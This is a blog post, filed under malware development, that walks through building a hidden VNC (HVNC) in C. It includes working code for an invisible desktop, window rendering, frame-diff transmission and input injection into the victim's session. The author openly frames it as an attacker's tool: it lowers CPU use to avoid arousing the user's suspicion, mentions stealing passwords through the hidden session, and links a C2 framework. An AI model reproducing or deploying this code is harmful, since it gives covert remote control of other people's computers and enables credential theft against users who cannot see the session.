---
layout: post
title: Intro to HVNC
date: 2024-11-02
categories: maldev
description: A beginner's introduction to HVNC
---
## Introduction

In this blog, I will showcase how to implement a very simple HVNC. Now I know that many others, including [MalwareTech](https://www.malwaretech.com/2015/09/hidden-vnc-for-beginners.html) have written great blog posts on HVNC, but they all seem to be lacking implementation details. As these days nearly every script kiddie can just use a copy of the (horribly designed) TinyNuke HVNC, I feel that it's rather pointless to not talk about HVNC for the sake of reducing script kiddies. So today I will focus on the theory and implementation of a HVNC, in pure C, with some efficiency optimizations to make it actually usable (versus the unusably slow TinyNuke).

## Creating the hidden desktop
So before we even start doing anything with HVNC, we need the hidden desktop. We will use the rare [CreateDesktopA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-createdesktopa) WinAPI to create a desktop.
```c
char* desktop_name = "haxxordesktop12345";
dsk = OpenDesktopA(desktop_name, 0, FALSE, GENERIC_ALL);
if(dsk==NULL)
    dsk = CreateDesktopA(desktop_name, NULL, NULL, 0, GENERIC_ALL, NULL);
SetThreadDesktop(dsk);
```
So first we try to `OpenDesktopA`, see if we have created the desktop before, if not, `CreateDesktopA`, then finally `SetThreadDesktop`. Quite self-explanatory. Note that the desktop made by `CreateDesktopA` is **completely invisible**, which is why this feature is incredibly attractive to malware developers.

## Window Rendering
This is the crux of HVNC design. The problem with HVNC, is that Windows does **not** automatically render all the windows present on the hidden desktop (that makes sense, as the user can't see it anyways), but this is terrible for us, as we cannot just speedrun and use `GetDC(NULL)` with a `BitBlt` (this works for regular VNC) and expect things to work out. We need to manually render everything! So let us start our journey, with the reverse Z-order.

### Reverse Z-order
So, what is this Z-order? According to [Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/winmsg/window-features#z-order): 

> The _z-order_ of a window indicates the window's position in a stack of overlapping windows. This window stack is oriented along an imaginary axis, the z-axis, extending outward from the screen. The window at the top of the z-order overlaps all other windows. The window at the bottom of the z-order is overlapped by all other windows.

So, what we want to do, is get the bottommost window, the last of the Z-order, and keep going up one window, until we hit the topmost window!
```c
HWND curw = GetWindow(GetTopWindow(NULL), GW_HWNDLAST);
while(curw != NULL){
    if(IsWindowVisible(curw))
        // do something
    curw = GetWindow(curw, GW_HWNDPREV);
}
```
We ignore all invisible windows to save CPU. Now that we know how to walk the Z-order, time to go on to rendering the windows!

### Double buffering
In order to have the windows be properly rendered later on, we need double buffering. We can do it like so:
```c
SetWindowLongA(hwnd, GWL_EXSTYLE, GetWindowLongA(hwnd, GWL_EXSTYLE) | WS_EX_COMPOSITED);
```
We turn on the flag of `WS_EX_COMPOSITED` on the window, so that double buffering is enabled. Now, let's combine this with our previous code,
```c
HWND curw = GetWindow(GetTopWindow(NULL), GW_HWNDLAST);
while(curw != NULL){
    if(IsWindowVisible(curw))
        SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) | WS_EX_COMPOSITED);
    curw = GetWindow(curw, GW_HWNDPREV);
}
Sleep(50);
```
We put a `Sleep` at the end, to give all the windows some time to process this change, before we start rendering them.

### Rendering
For this part, we simply walk the Z-order again, and send a call to `PrintWindow`. While I have heard that some applications do not handle `WM_PRINT` (the call sent by `PrintWindow`) correctly, leading to no rendering, I have tested all the basic software that a HVNC operator may use (including CMD, Powershell, Chrome, and others), and have not found any that pose this problem. So to reduce complexity, I omit this segment.

So, we create a `MemDC` walk the Z-order, call `PrintWindow` and `BitBlt` on each window, from bottom to the top, until we have rendered all the windows!
```c
HDC memdc = CreateCompatibleDC(hdc);
HBITMAP hbitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
SelectObject(memdc, hbitmap);
while(curw != NULL){
    if(!IsWindowVisible(curw)) goto next;
    RECT wRect;
    GetWindowRect(curw, &wRect);
    HDC wdc = CreateCompatibleDC(hdc);
    HBITMAP wbitmap = CreateCompatibleBitmap(hdc, rect.right - rect.left, rect.bottom - rect.top);
    SelectObject(wdc, wbitmap);
    if (PrintWindow(curw, wdc, 0))
        BitBlt(memdc, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, wdc, 0, 0, SRCCOPY);
    SetWindowLongA(curw, GWL_EXSTYLE, GetWindowLongA(curw, GWL_EXSTYLE) ^ WS_EX_COMPOSITED);
    DeleteObject(wbitmap);
    DeleteDC(wdc);
next:
    curw = GetWindow(curw, GW_HWNDPREV);
}
```

We also unset `WS_EX_COMPOSITED` on every window after printing it, as double buffering takes up a lot of CPU, and we want it to be enabled as little as possible, to prevent high CPU usage that may seem suspicious to end users.

Great! By this point, we have a full render of the hidden desktop window in `hbitmap`. Next step, is to transmit this data to the server.

## Data transfer
### Optimization
In order to decrease data transfer (and hence latency), we only want to transmit the bytes that have been changed. I will do a very simple method, to draw a rectangle that encompasses all the changed pixels, and only transmit that. While this is definitely not the best algorithm, it is simple, and highly effective for things like typing, where only a few pixels change at a time.

First we get the bits of the `hbitmap`,
```c
DWORD cb = GetBitmapBits(hbitmap, 10000000, bitmap);
int bpb = cb/(rect.right*rect.bottom);
```

Now find the rectangle,
```c
int top = 0;
int topset = 0;
int left = rect.right;
int bot = 0;
int right = 0;

for(int i=0;i<cb;i+=bpb){
    if(memcmp(pastbm+i, bitmap+i, bpb)!=0){
        int y = i/(bpb*rect.right);
        if(!topset){
            top = y;
            topset = 1;
        }
        int x = (i/bpb)%rect.right;
        if(x<left) left = x;
        if(x>right) right = x;
        if(y>bot) bot = y;
    }
}
if(left==rect.right) left=0;
bot++;
right++;
if(bot>rect.bottom) bot = rect.bottom;
if(right>rect.right) right = rect.right;
```

So now, `top`, `left`, `bot`, and `right`, store the rectangle of changed pixels! Anything outside that rectangle, contains pixels that are identical to that of the previous frame, so we can omit that.

### Compression
After this, we can compress the raw bitmap, into a compressed format of your choice. I used PNG for this, I will omit the code as it's not very important, merely use of GDIPlus functions. You can see the implementation in the linked repository later.

### Sending the data
Finally, we just broadcast the rectangle, along with the coordinates of the top-left corner. This will be rendered on the server. Again, implementation of this is not too important, just use of some Winsock functions.

## User input
Now, a desktop is useless if you cannot interact with it. So, we need a way to input user data. We assume we already have the instructions of what operation to do (ie keyboard or mouse action), as that is just yet another Winsock action.

### Keyboard
The keyboard is relatively simple, as it can only really be sent to the topmost window. So we just get that, and send the keycode to it with a `PostMessage` call.
```c
HANDLE hwd = GetTopWindow(NULL);
PostMessage(hwd, WM_KEYDOWN, keycode, 0 );
```

### Mouse
The mouse is more complicated, as you could be clicking on a window that is not in focus. So we start with a `WindowFromPoint` call, and from there, recursively call `ChildWindowFromPoint`, as `WindowFromPoint` does not consider disabled or hidden windows, according to the [Microsoft Docs](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-windowfrompoint).
```c
POINT point;
point.x = x;
point.y = y;
hwd = WindowFromPoint(point);
for (HWND currHwnd = hwd;;){
    hwd = currHwnd;
    ScreenToClient(hwd, &point);
    currHwnd = ChildWindowFromPoint(hwd, point);
    if (currHwnd == NULL || currHwnd == hwd)
        break;
}
```
`ScreenToClient` is used to convert global coordinates to the coordinates of the window, as each window is only aware of itself, and not the global coordinate system. Now, we just need to send a click to the window we found, with a `PostMessage`.
```c
LPARAM lParam = MAKELPARAM(point.x, point.y);
PostMessage(hwd, WM_LBUTTONDOWN, 0, lParam);
Sleep(100);
PostMessage(hwd, WM_LBUTTONUP, 0, lParam);
```
To make things simple, I only implement single click, but it is trivial to make other clicks supported. Just like that, we have implemented a very simple HVNC! We can open Chrome, steal some passwords, whatever it is HVNC is used for.

## Conclusion
The code for this repo can be found at [https://github.com/fern89/hvnc/](https://github.com/fern89/hvnc/). Note that this HVNC is incredibly limited, and does not support things like closing, minimizing, moving around windows, and basically all the window-manager functionalities. For a more complex HVNC, you can refer to the HVNC found in my [C2 framework](https://github.com/fern89/C2/blob/main/agent/vnc/hvnc.h), or the [TinyNuke implementation](https://github.com/Meltedd/HVNC/blob/main/Client/HiddenDesktop.cpp). Overall, this post merely is meant to serve as a beginner's introduction to HVNC, and our goal for this project is just to be able to open YouTube and play a rickroll.

![Image of the Rickroll demo](/assets/media/hvnc/demo.png)